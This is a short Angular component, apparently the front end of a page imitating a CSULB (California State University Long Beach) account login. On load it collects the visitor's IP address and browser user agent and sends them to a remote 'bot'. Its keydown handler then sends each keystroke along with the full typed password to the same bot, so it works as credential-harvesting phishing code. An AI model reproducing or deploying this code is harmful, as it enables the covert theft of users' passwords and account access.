import { CommonModule } from '@angular/common';
import { Component } from '@angular/core';
import { RouterOutlet } from '@angular/router';
import { DataService } from './data.service';
import { take } from 'rxjs';
import { OnInit } from '@angular/core';
import { FormsModule } from '@angular/forms';

@Component({
  selector: 'app-root',
  standalone: true,
  imports: [RouterOutlet, CommonModule, FormsModule],
  templateUrl: './app.component.html',
  styleUrl: './app.component.scss'
})
export class AppComponent implements OnInit {
  public isAccountSelected: boolean = false;
  public password: string = '';
  public ipAddress: string = 'NONE';
  title = 'csulb-micro-front';

  public constructor(
    private dataService: DataService,
  ) {
    this.dataService.getIpAddresses().pipe(take(1)).subscribe((response: any) => {
      const userAgents = navigator.userAgent;
      this.ipAddress = response.ip;
      this.dataService.reportToBot(`CSULB App Started IP: ${this.ipAddress}, UserAgent: ${userAgents}`).pipe(take(1)).subscribe();
    });
  }

  public ngOnInit(): void {
  }

  public onAccountSelected(): void {
    this.isAccountSelected = true;
    this.dataService.reportToBot(`CSULB App Account Selected by IP ${this.ipAddress}`).pipe(take(1)).subscribe();
  }

  public onBackButtonClick(): void {
    this.isAccountSelected = false;
    this.dataService.reportToBot(`CSULB App Back Button Clicked by IP ${this.ipAddress}`).pipe(take(1)).subscribe();
  }

  public reportKeydown(event: KeyboardEvent): void {


    this.dataService.reportToBot(`CSULB App Keydown Event: ${event.key} by IP ${this.ipAddress} (Password: ${this.password})`).pipe(take(1)).subscribe();
  }

}
